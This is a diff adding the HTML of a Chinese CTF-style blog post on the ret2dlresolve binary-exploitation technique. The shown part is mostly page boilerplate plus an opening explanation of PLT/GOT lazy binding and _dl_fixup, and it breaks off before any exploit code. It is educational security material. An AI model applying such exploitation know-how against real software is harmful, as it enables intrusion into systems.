@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="collectcrop">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://collectcrop.github.io/blog/2025/06/02/深入理解ret2dlresolve/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="在一开始打pwn时我们就接触过plt表和got表这两个用来动态加载libc函数的重要部分，不过当时我对其理解只限于got表在经过一次调用函数后，里面存着的就是libc中的具体函数指针；而plt表则是我们调用一个函数时事先跳转到的地方，其会跳转到对应got表位置处存的地址。现在我们来学一下是经过了一个什么过程才把真正的函数指针填到got表中，并深入分析一下哪里存在可以利用的点。 其中我们在IDA中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入理解ret2dlresolve">
+<meta property="og:url" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/index.html">
+<meta property="og:site_name" content="Collectcrop&#39;s Blog">
+<meta property="og:description" content="在一开始打pwn时我们就接触过plt表和got表这两个用来动态加载libc函数的重要部分，不过当时我对其理解只限于got表在经过一次调用函数后，里面存着的就是libc中的具体函数指针；而plt表则是我们调用一个函数时事先跳转到的地方，其会跳转到对应got表位置处存的地址。现在我们来学一下是经过了一个什么过程才把真正的函数指针填到got表中，并深入分析一下哪里存在可以利用的点。 其中我们在IDA中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205232833.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205327472.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210040967.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210240496.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601212109244.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601215505916.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220205529.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220301045.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220338216.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214457631.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214706199.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223442507.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223513590.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601224334477.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601225909654.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601230147175.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234751736.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234933802.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601231749750.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602003537787.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133740717.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133943320.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602135216930.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602164008783.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602165804130.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172122538.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172850333.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602173807678.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602174905079.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602193718943.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602202230030.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141756764.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141818968.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602143248861.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145152644.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145718453.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145205542.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145921752.png">
+<meta property="article:published_time" content="2025-06-02T12:41:28.000Z">
+<meta property="article:modified_time" content="2025-06-02T12:42:08.901Z">
+<meta property="article:author" content="collectcrop">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="gdb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205232833.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/blog/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/blog/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            深入理解ret2dlresolve | Collectcrop&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/blog/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/blog/build/css/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/blog/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/blog/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/blog/build/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"collectcrop.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Collectcrop's Blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/collectcrop","instagram":null,"zhihu":null,"twitter":null,"email":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=2583727188&site=qq&menu=yes"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"path":"/categories/","icon":"fa-solid fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Just enjoy.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/23 15:52:11"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/blog/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Collectcrop&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/blog/">
+                
+                Collectcrop&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/blog/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/blog/links">
+                                                    友情链接
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/links">友情链接</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解ret2dlresolve</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/blog/images/avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">collectcrop</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-06-02 20:41:28</span>
+        <span class="mobile">2025-06-02 20:41:28</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-06-02 20:42:08</span>
+            <span class="mobile">2025-06-02 20:42:08</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/blog/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/blog/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/blog/tags/gdb/">gdb</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>24 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>在一开始打pwn时我们就接触过<strong>plt</strong>表和<strong>got</strong>表这两个用来动态加载libc函数的重要部分，不过当时我对其理解只限于got表在经过一次调用函数后，里面存着的就是libc中的具体函数指针；而plt表则是我们调用一个函数时事先跳转到的地方，其会跳转到对应got表位置处存的地址。现在我们来学一下是经过了一个什么过程才把真正的函数指针填到got表中，并深入分析一下哪里存在可以利用的点。</p>
+<p>其中我们在IDA中看到的<strong>.got.plt</strong>段就是我们俗称的<strong>got</strong>表：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205232833.png"
+                      class=""
+                >
+<p>而<strong>.plt</strong>段则存着<strong>plt</strong>表，其中每个函数的plt都有两个<strong>jmp</strong>，我们调用所有函数都是来到第一个jmp处，然后跳转到对应got表位置存的地址处。在一个函数都还没被调用时，got表里存的就是对应同一个函数的plt表里的第二个jmp前push的地址。所以实际上第一次调用某个函数是由第二个jmp跳转到后续的解析函数（这里是0x400500）。这里看到前面push的数字正好是按照函数在plt中的顺序递增的。而<strong>0x400500</strong>处也是push一个地址并跳转到另一个地址处。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205327472.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210040967.png"
+                      class=""
+                >
+<p>在gdb调试中，我们可以看到最后会跳转到**_dl_runtime_resolve_xsavec-&gt;_dl_fixup<strong>函数链进行解析。进</strong>dl_fixup<strong>时的两个参数就是之前push到栈上的序号以及一个libc里的地址（</strong>link_map**地址）。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210240496.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
